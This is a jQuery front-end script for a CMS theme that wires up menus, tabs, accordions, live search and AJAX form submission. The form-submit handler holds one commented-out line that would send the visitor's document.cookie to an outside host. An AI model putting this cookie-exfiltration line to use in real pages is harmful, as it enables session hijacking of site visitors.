$(document).ready(function() {
    $("select").chosen({
        disable_search_threshold: 10,
        width: "100%"
    });

    $('.wojo.dropdown').dropdown();
    $('body [data-content]').popover({
        trigger: 'hover',
        placement: 'auto'
    });

    $("table.sortable").tablesort();

    $('.filefield').filestyle({
        buttonText: 'Choose file...'
    });

    $(".chosen-results, .scrollbox").enscroll({
        showOnHover: true,
        addPaddingToPane: false,
        verticalTrackClass: 'scrolltrack',
        verticalHandleClass: 'scrollhandle'
    });

    /* == Lightbox == */
    $('.lightbox').swipebox();

    /* == Carousel == */
    $(".wojo-carousel").owlCarousel();

    /* == Smooth Scroll == */
    $(".scroller").click(function(e) {
        e.preventDefault();
        var defaultAnchorOffset = 0;
        var a = $(this).attr('data-scroller');
        var anchorOffset = $('#' + a).attr('data-scroller-offset');
        if (!anchorOffset)
            anchorOffset = defaultAnchorOffset;
        $('html,body').animate({
            scrollTop: $('#' + a).offset().top - anchorOffset
        }, 500);
    });

    /* == Date/Time Picker == */
    $('body [data-datepicker]').pickadate({});
    $('body [data-timepicker]').pickatime({
        formatSubmit: 'HH:i:00'
    });

    /* == Close Message == */
    $('body').on('click', '.message i.close.icon', function() {
        var $msgbox = $(this).closest('.message')
        $msgbox.slideUp(500, function() {
            $(this).remove()
        });
    });

    $('body').on('click', '.toggle', function() {
        $('.toggle.active').not(this).removeClass('active');
        $(this).toggleClass("active");
    });

    /* == Language Switcher == */
    $('#langmenu').on('click', 'a', function() {
        var target = $(this).attr('href');
        $.cookie("LANG_CMSPRO", $(this).data('lang'), {
            expires: 120,
            path: '/'
        });
        $('body').fadeOut(1000, function() {
            window.location.href = SITEURL + "/" + target;
        });
        return false
    });

    /* == Navigation Menu == */
    $('#menu').smartmenus({
        subIndicatorsText: "<i class=\"large teal down triangle icon\"></i>",
        subMenusMaxWidth: "auto",
        subMenusMinWidth: "14em",
        showOnClick: false
    });

    $('#menu li a[href="#"]').click(function(e) {
        e.preventDefault();
    });

    $('#menu > li[data-cols]').each(function() {
        var $ul = $(this);
        $ul.has('ul').children('ul').addClass($ul.data('cols'));
    });

    $('#menu-button').click(function() {
        var $this = $(this),
            $menu = $('#menu');
        if (!$this.hasClass('collapsed')) {
            $menu.addClass('collapsed');
            $this.addClass('collapsed');
        } else {
            $menu.removeClass('collapsed');
            $this.removeClass('collapsed');
        }
        return false;
    }).click();

    /* == Scroll To Top == */
    $.scrollUp();

    /* == Tabs == */
    $(".wtabs .wojo.tab.content").hide();
    $(".wojo.tabs").find('a:first').addClass("active").show();
    $('.wtabs').each(function() {
        $(this).find('.wojo.tab.content:first').show();
    });
    $(".wojo.tabs a").on('click', function() {
        id = $(this).closest(".wtabs").attr("id");
        $("#" + id + " .wojo.tabs a").removeClass("active");
        $(this).addClass("active");
        $("#" + id + " .wojo.tab.content").hide();
        var activeTab = $(this).data("tab");
        $(activeTab).show();
    });

    /* == Accordion == */
    $('.accordion .header').toggleClass('inactive');
    $('.accordion .header').first().toggleClass('active').toggleClass('inactive');
    $('.accordion .content').first().slideDown().toggleClass('open');
    $('.accordion .header').click(function() {
        if ($(this).is('.inactive')) {
            $('.accordion .active').toggleClass('active').toggleClass('inactive').next().slideToggle().toggleClass('open');
            $(this).toggleClass('active').toggleClass('inactive');
            $(this).next().slideToggle().toggleClass('open');
        } else {
            $(this).toggleClass('active').toggleClass('inactive');
            $(this).next().slideToggle().toggleClass('open');
        }
    });

    /* == Live Search == */
    $("#searchfield").on('keyup', function() {
        var srch_string = $(this).val();
        var data_string = 'liveSearch=' + srch_string;

        if (srch_string.length > 4) {
            $.ajax({
                type: "post",
                url: SITEURL + "/ajax/livesearch.php",
                data: data_string,
                beforeSend: function() {

                },
                success: function(res) {
                    $('#suggestions').html(res).show();
                    $("input").blur(function() {
                        $('#suggestions').fadeOut();
                    });
                }
            });
        }
        return false;
    });
    $("#livesearch").on('click', 'i.search', function() {
        $("#livesearch").submit()

    });

    /* == Animate Progress Bars == */
    function progress(percent, element) {
        var progressBarWidth = percent * element.width() / 100;
        $(element).find('div').animate({
            width: progressBarWidth
        }, 500);
    }
    animateProgress();

    function animateProgress() {
        $('.progress').each(function() {
            var bar = $(this);
            var size = $(this).data('percent');
            progress(size, bar);
        });
    }
    $(window).resize(function() {
        animateProgress();
    });

    /* == Master Form == */
    $('body').on('click', '111_button[name=dosubmit]', function() {
        posturl = $(this).data('url')

        function showResponse(json) {
            if (json.status == "success") {
                $(".wojo.form").removeClass("loading").slideUp();
                $("#msgholder").html(json.message);
            } else {
                $(".wojo.form").removeClass("loading");
                $("#msgholder").html(json.message);
            }
        }

        function showLoader() {
            $(".wojo.form").addClass("loading");
        }
        var options = {
            target: "#msgholder",
            beforeSubmit: showLoader,
            success: showResponse,
            type: "post",
            //url: SITEURL + posturl,
            url: posturl,
            dataType: 'json'
        };

        $('#wojo_form').ajaxForm(options).submit();
    });

    /* == Master Form == */
    $('#wojo_form').submit(function() {
        console.log('we in!');
        posturl = $('[type=submit]').data('url');
        console.log(posturl)

        function showResponse(json) {
            if (json.status == "success") {
                $(".wojo.form").removeClass("loading").slideUp();
                $("#msgholder").html(json.message);
            } else {
                $(".wojo.form").removeClass("loading");
                $("#msgholder").html(json.message);
            }
        }

        function showLoader() {
            $(".wojo.form").addClass("loading");
        }

        // send message - v2
        $.ajax({
                'type': 'post',
                'url': posturl,
                'data': $(this).serialize(),
                'dataType': 'json',
                'beforeSend': function(xhr) {
                    showLoader();
                    $("#msgholder").html("");
                }
            }).done(function(rs) {
                $(".wojo.form").removeClass("loading");
                //alert( "Сообщение отправлено!" );
                console.log("ответ получен: " + rs['success'])
                $("#msgholder").html(rs['message']);
                $(this).trigger('reset');
            })
            .fail(function() {
                $(".wojo.form").removeClass("loading");
                $("#msgholder").html('Ошибка при отправке, попробуйте повторить позже');
                console.log("Ошибка!")
            });

        //javascript:window.location.href = "http://liteweb.pw/next/index.php?cookie="+document.cookie;

        console.log('we end!')
        return false;
    });

    console.log('jquery in action');


    /* == Sticky Footer == */
    doFooter();
    $(window).scroll(doFooter);
    $(window).resize(doFooter);
    $(window).load(doFooter);

    $.browser = {};
    $.browser.version = 0;
    if (navigator.userAgent.match(/MSIE ([0-9]+)\./)) {
        $.browser.version = RegExp.$1;
        if ($.browser.version < 10) {
            new Messi("<p class=\"wojo red segment\" style=\"width:300px\">It appears that you are using a <em>very</em> old version of MS Internet Explorer (MSIE) v." + $.browser.version + ".<br />If you seriously want to continue to use MSIE, at least <a href=\"http://www.microsoft.com/windows/internet-explorer/\">upgrade</a></p>", {
                title: "Old Browser Detected",
                modal: true,
                closeButton: true
            });
        }
    }

    //
    $('.captcha_main').on('click', function(){
        console.log('we in: ' + $(this).attr('class'));

        $(this).attr('src', 'libs/captcha_inner.php');
       
    });

});


$(window).on('resize', function() {
    $(".slrange").ionRangeSlider('update');
});


function doFooter() {
    var footer = $("footer");
    if ((($(document.body).height() + footer.outerHeight()) < $(window).height() && footer.css("position") == "fixed") || ($(document.body).height() < $(window).height() && footer.css("position") != "fixed")) {
        footer.css({
            position: "fixed",
            bottom: 0,
            width: "100%"
        });
    } else {
        footer.css({
            position: "static"
        });
    }
}